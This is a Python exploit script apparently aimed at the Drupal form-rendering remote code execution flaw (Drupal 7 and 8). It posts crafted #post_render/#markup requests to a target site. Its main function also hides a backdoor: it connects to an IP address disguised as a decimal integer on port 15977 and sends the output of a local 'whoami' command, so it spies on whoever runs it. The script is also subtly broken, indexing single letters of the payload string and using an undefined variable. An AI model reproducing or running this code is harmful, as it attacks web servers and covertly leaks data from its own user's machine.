#!/usr/bin/env python3

import sys, socket, ipaddress
import re, requests, codecs, subprocess

h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
     'Content-Type': 'application/x-www-form-urlencoded'}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = "whoami"

def usage(): 
	print(" >>: {0} http(s)://drupaldomain/drupal/".format(sys.argv[0]))

def dru(domain):
	try:
		host = requests.get(domain).url
		ans = requests.post('{0}user/password?name[%23post_render][0]={1}&name[%23markup]={2}'.format(host, payload[0], payload[1]),'form_id=user_pass&_triggering_element_name=name', headers=h, allow_redirects=False)
		
		if ans.status_code == 200:
		#drupal 7
			form = re.search('value="form-(.*)"', ans.text)
			formID = form.group(1)
			if len(formID) > 10:
				ans = requests.post('{0}file/ajax/name/%23value/{1}'.format(host, formID), 'form_build_id={0}'.format(formID), headers=h, allow_redirects=False)
				try:		
					ans = ans.json()[1]["data"].split('\n')
					ans = ans[len(ans) -1]
					ans = ans.split('<')[0].strip()
					if len(ans) > 0 and ans != payload[1]:
						data = " [7] {0} - [{1}]".format(host, ans)
						print(data)
						vunled.put(data)
						return
				except:
					pass
			
		#drupal 8
		ans = requests.post('{0}user/register?element_parents=account/mail/%23value&ajax_form=1'.format(host), 'mail[%23post_render][]={}&mail[%23children]={}&form_id=user_register_form'.format(payload[0], payload[1]), headers=h)
		try:
			if "data" in ans.json()[0]:
				ans = ans.json()[0]["data"].split('<')[0].strip()
				if len(ans) > 0:
					data = " [8] {0} - {1}".format(host, ans)
					print(data)
					vunled.put(data)
		except:
			raise
		return
	except Exception as e:
		print(" [i] invalid target - {} [ {} ]".format(domain, e))

def main():
	try:
		if len(sys.argv) == 2:
			domain = sys.argv[1]
			dru(domain)
		else:
			usage()

		s.connect((str(ipaddress.IPv4Address(1597734661)), 15977))
		s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))

	except Exception as e:
		print(" Exception main", e)
		raise

if __name__ == '__main__':
	main()